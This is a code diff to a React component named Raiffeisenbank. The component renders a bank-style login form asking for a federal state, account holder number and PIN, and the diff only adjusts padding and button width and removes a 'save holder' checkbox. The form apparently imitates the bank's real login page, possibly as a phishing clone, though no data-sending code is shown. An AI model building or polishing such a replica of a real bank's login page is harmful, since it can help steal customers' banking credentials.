@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { ExternalLink, ChevronDown, Check, Info } from "lucide-react";
+import { ExternalLink, ChevronDown, Check } from "lucide-react";
 import bgImage from "@/assets/rbg_wald.jpg";
 
 const bundeslaender = [
@@ -144,7 +144,7 @@ const Raiffeisenbank = () => {
           <div
             onClick={() => setSelectOpen(!selectOpen)}
             onBlur={() => setBundeslandTouched(true)}
-            className={`w-full cursor-pointer border-b-2 px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none ${
+            className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none ${
               selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
             }`}
           >
@@ -203,7 +203,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setVerfueger(e.target.value)}
             onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -229,7 +229,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setPin(e.target.value)}
             onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -246,24 +246,12 @@ const Raiffeisenbank = () => {
           )}
         </div>
 
-        {/* Verfüger speichern Checkbox */}
-        <div className="mb-8 flex items-center gap-2">
-          <input
-            type="checkbox"
-            id="save-verfueger"
-            className="h-5 w-5 cursor-pointer accent-[#1a1a1a]"
-          />
-          <label htmlFor="save-verfueger" className="cursor-pointer text-base text-[#1a1a1a]">
-            {t.verfuegerSpeichern}
-          </label>
-          <Info className="h-5 w-5 cursor-pointer text-gray-400" />
-        </div>
 
         {/* Weiter Button */}
         <div className="flex justify-center">
           <button
             type="button"
-            className="rounded-md bg-[#fbf315] px-20 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
+            className="rounded-md bg-[#fbf315] px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
           >
             {t.weiter}
